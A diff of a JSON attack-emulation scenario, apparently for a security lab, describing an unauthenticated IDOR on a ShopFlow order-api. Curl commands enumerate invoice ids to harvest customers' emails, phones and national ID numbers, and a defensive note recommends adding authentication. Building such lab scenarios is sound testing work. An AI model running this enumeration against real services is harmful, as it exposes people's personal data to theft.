@@ -1,25 +1,28 @@
 {
   "_note": "핵심층 환경 — ShopFlow order-api BOLA/IDOR(B1). 인증 없이 주문 영수증 id 를 열거해 타 고객 PII(주민번호·이메일·전화) 대량 수집. catalog-api SQLi 와 독립적인 크라운 직행 경로(다른 서비스, 다른 패치). 방어: patch_app order-api(인증 요구+PII 최소화).",
-
   "env": "shopflow-bola",
-  "technique": "T1190",
+  "technique": "WEB_BOLA",
   "cwe": "CWE-639",
-
   "procedure": {
     "id": "PROC-shopflow-bola",
     "name": "order-api 영수증 IDOR 로 고객 PII 대량 수집",
     "description": "frontend 발판에서 order-api /api/invoice/<oid> 를 순차 호출(oid=1,2,3...). 인증·소유자 검사가 없어 모든 고객의 이름·이메일·전화·주소·주민번호(ssn)가 반환된다. ★ catalog-api 가 patch_app 으로 하드닝돼도 order-api 는 별도 서비스라 영향 없음 — 패치 분산 경로.",
     "status": "AUTHORED",
     "steps": [
-      {"id": "STEP-bola-single", "seq": 1,
-       "command": "curl -s http://order-api.backend.svc.cluster.local:8080/api/invoice/1",
-       "description": "영수증 1번 조회 — 응답에 customer·email·phone·ssn 이 인증 없이 반환되는지 확인"},
-      {"id": "STEP-bola-enum", "seq": 2,
-       "command": "for i in 1 2 3 4 5; do curl -s http://order-api.backend.svc.cluster.local:8080/api/invoice/$i; echo; done",
-       "description": "id 열거로 여러 고객의 PII 대량 수집(크라운 — customers_pii)"}
+      {
+        "id": "STEP-bola-single",
+        "seq": 1,
+        "command": "curl -s http://order-api.backend.svc.cluster.local:8080/api/invoice/1",
+        "description": "영수증 1번 조회 — 응답에 customer·email·phone·ssn 이 인증 없이 반환되는지 확인"
+      },
+      {
+        "id": "STEP-bola-enum",
+        "seq": 2,
+        "command": "for i in 1 2 3 4 5; do curl -s http://order-api.backend.svc.cluster.local:8080/api/invoice/$i; echo; done",
+        "description": "id 열거로 여러 고객의 PII 대량 수집(크라운 — customers_pii)"
+      }
     ]
   },
-
   "preconditions": [
     {
       "id": "PRE-bola-orderapi-reachable",
@@ -27,15 +30,22 @@
       "description": "frontend 발판에서 order-api.backend.svc.cluster.local:8080 에 HTTP 요청을 보낼 수 있고, /api/invoice/<oid> 에 인증·인가 검사가 없음."
     }
   ],
-
   "expected_results": [
     {
       "id": "ER-bola-crown",
       "name": "BOLA 로 고객 PII 대량 반출 (크라운)",
       "kind": "crown",
-      "outcome": {"id": "AO-data-exposure", "name": "민감 데이터 유출"},
+      "outcome": {
+        "id": "AO-data-exposure",
+        "name": "민감 데이터 유출"
+      },
       "conditions": [
-        {"channel": "crown", "field": "asset", "operator": "eq", "expected": "customers_pii"}
+        {
+          "channel": "crown",
+          "field": "asset",
+          "operator": "eq",
+          "expected": "customers_pii"
+        }
       ]
     }
   ]
